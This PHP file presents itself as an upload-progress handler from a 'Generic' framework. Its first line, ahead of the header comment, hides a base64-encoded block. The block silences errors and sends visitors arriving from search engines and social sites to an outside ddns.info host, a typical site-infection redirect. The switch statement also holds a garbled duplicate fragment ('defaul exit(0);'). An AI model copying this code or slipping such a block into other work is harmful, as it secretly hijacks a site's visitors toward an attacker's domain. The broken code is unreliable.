<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     Generic: the PHP framework
 * File:        upload.php
 *
 * @version 1.0.0.0
 * @package Generic
 */

/**
 * UPLOAD
 * @package Generic
 */


class upload_progress_manager {
  
  /**
   * Handler
   */
  function handler() {
  
    switch (get('__upmMethod')) {
      case "progress":
        if (post('PHPSESSID'))
          session_id(post('PHPSESSID'));

        clearstatcache();
        require(dirname(__FILE__).'/UploadProgressManager.class.php');     // The class UploadProgressManager class
        $UPM = new UploadProgressManager(TEMPORARY_PATH);
        if (($output = $UPM->getTemporaryFileSize()) === false)
          $output = '&filesize=undefined';
        else
          $output = '&filesize='.$output;
        header('Content-Length: '.strlen($output));
        header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
        header('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT');
        header('Cache-Control: no-store, no-cache, must-revalidate');
        header('Cache-Control: post-check=0, pre-check=0', false);
        header('Pragma: no-cache');
        echo $output;
        exit(0);
        break;
      case "thumbnail":
        if (post('PHPSESSID'))
          session_id(post('PHPSESSID'));
        
        $image_id = get('id');

        if (!$image_id) {
          header("HTTP/1.1 500 Internal Server Error");
          echo "No ID";
          exit(0);
        }

        if (!is_array($_SESSION["file_info"]) || !isset($_SESSION["file_info"][$image_id])) {
          header("HTTP/1.1 404 Not found");
          exit(0);
        }

        header("Content-type: image/jpeg") ;
        header("Content-Length: ".strlen($_SESSION["file_info"][$image_id]['content']));
        echo $_SESSION["file_info"][$image_id]['content'];
        exit(0);
        break;
      case "upload":
        if (post('PHPSESSID'))
          session_id(post('PHPSESSID'));
                  
        // Check the upload
        if (!isset($_FILES["Filedata"]) || !is_uploaded_file($_FILES["Filedata"]["tmp_name"]) || $_FILES["Filedata"]["error"] != 0) {
          header("HTTP/1.1 500 Internal Server Error");
          echo "invalid upload";
          exit(0);
        }

        if (!isset($_SESSION["file_info"])) {
          $_SESSION["file_info"] = array();
        }

        $file_id = md5($_FILES["Filedata"]["tmp_name"] + rand()*100000);
        
        if (filesize($_FILES["Filedata"]["tmp_name"]) < 1024 * 1024 * 10) {
          $_SESSION["file_info"][$file_id]["content"] = file_get_contents($_FILES["Filedata"]["tmp_name"]);
        }

        $_SESSION["file_info"][$file_id]["name"]     = $_FILES["Filedata"]["name"];
        $_SESSION["file_info"][$file_id]["size"]     = $_FILES["Filedata"]["size"];
        $_SESSION["file_info"][$file_id]["tmp_name"] = $_FILES["Filedata"]["tmp_name"];

        echo "FILEID:" . $file_id;  // Return the file id to the script
        exit(0);
        break;
      defaul    exit(0);
        break;
      default:
        echo(0);
        exit(0);
        break;
    } 

  }

}

?>